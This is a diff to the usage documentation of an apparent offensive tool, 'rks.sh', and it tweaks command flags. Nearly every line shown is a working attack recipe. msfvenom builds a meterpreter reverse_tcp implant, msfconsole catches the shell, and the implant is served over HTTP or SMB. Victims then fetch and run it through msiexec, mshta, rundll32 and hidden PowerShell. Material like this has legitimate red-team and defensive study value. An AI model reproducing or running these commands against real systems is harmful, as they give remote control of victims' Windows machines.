@@ -92,13 +92,13 @@ $ ./rks.sh -c "powershell.exe -nop -w hidden -e <base64_payload>" -m dialogbox
 - Execute an implant with `msiexec.exe` while hosting a webserver.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.msi
 
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
 
 $ sudo python -m http.server 80
 
-$ ./rks.sh -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi
+$ ./rks.sh -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
 ```
 
 - Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
@@ -114,7 +114,7 @@ $ ./rks.sh -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m di
 ```
 $ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name implant.dll; set share data; exploit"
 
-$ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0"
+$ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
 ```
 
 - Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
@@ -180,8 +180,6 @@ $ ./rks.sh -i implant.exe -o implant.exe -m cmdb64
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"
 
 $ ./rks.sh -c ".\implant.exe"
-
-meterpreter > sysinfo
 ```
 
 ### Privilege Escalation
